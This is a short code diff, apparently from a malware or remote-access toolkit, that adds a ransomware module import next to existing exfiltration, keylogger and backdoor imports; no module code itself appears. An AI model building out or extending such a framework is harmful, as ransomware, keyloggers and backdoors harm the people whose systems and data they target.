@@ -11,6 +11,7 @@ from modules import exfiltration
 from modules import keylogger
 from modules import backdoor
 from modules import instructions
+from modules import ransomware
 
 ###########################################################################################################################
 #################################################     INITIALIZATIONS     #################################################
